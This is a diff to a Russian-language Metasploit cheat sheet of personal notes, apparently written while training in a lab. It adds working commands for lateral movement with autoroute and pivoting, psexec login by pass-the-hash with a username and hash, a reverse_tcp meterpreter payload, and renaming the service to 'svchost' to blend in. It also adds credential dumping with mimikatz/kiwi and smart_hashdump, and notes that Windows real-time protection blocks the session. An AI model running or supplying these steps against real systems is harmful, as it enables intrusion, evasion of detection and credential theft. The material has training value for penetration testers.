@@ -11,13 +11,17 @@
 
 `sessions -l` посмотреть список открытых сессий 
 
-# Инициализация базы данных для сохранение информации.
+`show advanced` просмотреть дополнительные параметры для модуля
 
-1. Запуст postgresql.
+`getprivs` посмотреть привилегии
 
-`systemctl start start`
+# Инициализация базы данных для сохранение информации
 
-`systemctl enable start`
+1. Запустить postgresql.
+
+`systemctl start postgresql`
+
+`systemctl enable postgresql`
 
 2. Инициализация БД 
 
@@ -45,7 +49,7 @@
 
 `session -u <session_num>`
 
-3. Выходим из сессии meterpreter-а и используем для неё _post/multi/manage/autoroute_
+3.1 Выходим из сессии meterpreter-а и используем для неё _post/multi/manage/autoroute_
 
 `post/multi/manage/autoroute`
 
@@ -55,15 +59,25 @@
 
 `run`
 
-Если надо распечатать текущий статут autoroute:
+3.2 Передаем параметры прям из сессии meterpreter
+
+`run post/multi/manage/autoroute SUBNET=10.100.36.0 CMD=add`
+
+4.1 Если надо распечатать текущий статут autoroute:
 
 `set CMD print`
 
 `run`
 
+4.2 Альтернативный вариант
+
+`msf6 exploit(windows/smb/psexec) > route print`
+
 # smb_login или psexec модули 
 
 ## Доступ по паролю
+
+*Если в Windows включена "Защита в режиме реального времени", то создания сессии не происходит.*
 
 `use windows/smb/psexec`
 
@@ -75,7 +89,7 @@
 
 `set SMBUser eborisenko`
 
-### Необходимо проверить payload. Если Windows x64, то его требуется сменить.
+*Необходимо проверить payload. Если Windows x64, то его требуется сменить.*
 
 `set PAYLOAD payload/windows/x64/meterpreter/reverse_tcp`
 
@@ -87,17 +101,23 @@
 
 `set SMBPass 00000000000000000000000000000000:7661de2ec1fe5de9d91da21375bc618d`
 
-### Если в Windows включена "Защита в режиме реального времени", то создания сессии не происходит.
-
 Преобразование сессии meterpreter в cmd.exe.
 
 `shell`
+
+## Тонкая настройка
+
+`show advanced` - показывает дополнительные параметры модули я payload
+
+По умолчанию SERVICE_FILENAME псевдослучайное, можно переименовать, например, svchost.
+
+`set SERVICE_FILENAME svchost`
 
 # Получение скриншотов 
 
 ## Через получение system
 
-1. получаем права псевдопользователя system:
+1. Получаем права псевдопользователя system:
 
 `getsystem` 
 
@@ -135,13 +155,33 @@
 
 # Creds dump
 
-1. Из сессии meterpreter нужной разрядность (!) выполняем команду для загрузки mimikatz:
+1. *Mimikatz.* Из сессии meterpreter нужной разрядность (!) выполняем команду для загрузки mimikatz:
+
+meterpreter > sysinfo
+Computer        : WINDOWS10
+OS              : Windows 10 (10.0 Build 17134).
+Architecture    : *x64*
+System Language : en_US
+Domain          : SEC560
+Logged On Users : 2
+Meterpreter     : *x64*/windows
+
+Если сессия не той разрядности, мигрируем в процесс с нужной разрядностью, запущенный от SYSTEM.
+
+`meterpreter > ps -A x64 -s`
 
 `load kiwi`
 
-2. Извлекаем все возможные креды:
-
 `creds_all`
+
+2. *smart_hashdump.* This module is smart and will dump password hashes differently depending on the target system's role. If the target is a domain controller, it will pull passwords differently and from a dfferent location. 
+
+`info post/windows/gather/smart_hashdump`
+
+Запускаем прям в сессии meterpreter
+
+`meterpreter > run post/windows/gather/smart_hashdump`
+
 
 # Перемещение по диску
 
